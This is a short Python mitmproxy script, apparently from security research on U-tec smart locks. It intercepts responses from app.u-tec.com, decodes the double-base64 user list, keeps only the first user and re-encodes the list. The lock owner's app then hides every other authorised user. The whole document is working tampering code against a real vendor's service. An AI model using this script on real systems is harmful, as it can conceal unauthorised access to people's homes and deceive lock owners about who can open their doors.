"""
This script hides additional users on the utec lock system
"""

from mitmproxy import http, ctx
import base64, json, ast

def response(flow: http.HTTPFlow) -> None:
    if "app.u-tec.com" in flow.request.pretty_host:
        data = json.loads(flow.response.content)
        if 'data' in data:
            encoded_users = data['data'] 
            decoded_users = base64.b64decode(base64.b64decode(encoded_users))
            limited_users=(decoded_users.split(b'}')[0])+b"}]"
            replaced_data=base64.b64encode(base64.b64encode(limited_users))
            data['data']=str(replaced_data.decode())
            flow.response.content=json.dumps(data).encode()
            ctx.log.alert("[UTEC] Hid Userlist")

